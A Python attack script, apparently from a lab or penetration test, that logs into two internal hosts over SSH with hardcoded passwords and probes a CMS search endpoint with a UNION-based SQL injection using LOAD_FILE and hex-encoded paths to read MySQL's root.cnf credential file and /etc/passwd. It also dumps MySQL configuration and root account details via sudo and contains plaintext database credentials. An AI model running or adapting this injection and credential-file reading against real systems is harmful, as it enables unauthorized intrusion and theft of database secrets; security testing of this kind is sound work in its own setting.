#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test LOAD_FILE SQLi and check A-4 chain prerequisites"""
import paramiko
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:180]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.100.2', username=user, password=pwd, timeout=10)

print("="*60)
print("A-4: LOAD_FILE CHECK")
print("="*60)

# 1. Check secure_file_priv on A2 MySQL
print("\n--- 1. Check secure_file_priv ---")
run(c2, "echo 'Gdadmin@123' | sudo -S grep -E 'secure_file_priv|secure-file-priv' /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -e \"SHOW VARIABLES LIKE 'secure_file_priv';\" 2>&1")

# 2. Check if root.cnf is readable
print("\n--- 2. Check file permissions ---")
run(c2, "ls -la /etc/mysql/mysql.conf.d/root.cnf")
run(c2, "cat /etc/mysql/mysql.conf.d/root.cnf")

# 3. Try LOAD_FILE via hex-encoded path
print("\n--- 3. LOAD_FILE with hex path ---")
# /etc/mysql/mysql.conf.d/root.cnf in hex:
# 0x2f6574632f6d7973716c2f6d7973716c2e636f6e662e642f726f6f742e636e66
# Let me generate it
import codecs
path = '/etc/mysql/mysql.conf.d/root.cnf'
hex_path = '0x' + codecs.encode(path.encode(), 'hex').decode()
print(f"Hex path: {hex_path}")

# Use the hex path in SQLi
# test' UNION SELECT 1,LOAD_FILE(HEX_PATH),3,4#
payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path}),3,4%23"
print(f"Payload: {payload[:120]}...")
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# 4. Try alternative - check if we can read via mysql user on A2 directly
print("\n--- 4. Direct LOAD_FILE test on A2 ---")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -e \"SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf');\" 2>&1")
run(c2, "mysql -u cmsuser -p'Cm5Us3r@2024!' -h localhost -e \"SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf') as result;\" 2>&1")

# 5. Try to read via the mysql root account
print("\n--- 5. Check mysql root account accessibility ---")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -e \"SELECT user, host, plugin, account_locked FROM mysql.user WHERE user='root';\" 2>&1")

# 6. Check if the file content is accessible via formula
print("\n--- 6. Alternative: check mysql configs ---")
run(c2, "echo 'Gdadmin@123' | sudo -S cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null | grep -E 'secure_file|user|password|bind' | head -10")

# 7. Try LOAD_FILE with different paths
print("\n--- 7. Try other LOAD_FILE paths ---")
for test_path in ['/etc/passwd', '/etc/hostname']:
    hex_p = '0x' + codecs.encode(test_path.encode(), 'hex').decode()
    payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_p}),3,4%23"
    out, _, _ = run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")
    if 'title' in out:
        import json
        try:
            data = json.loads(out)
            if data.get('data') and data['data'][0]['title']:
                print(f"  {test_path}: SUCCESS - {data['data'][0]['title'][:100]}")
            else:
                print(f"  {test_path}: NULL (secure_file_priv likely set)")
        except:
            print(f"  {test_path}: parse error")

c1.close()
c2.close()
print("\nDone!")
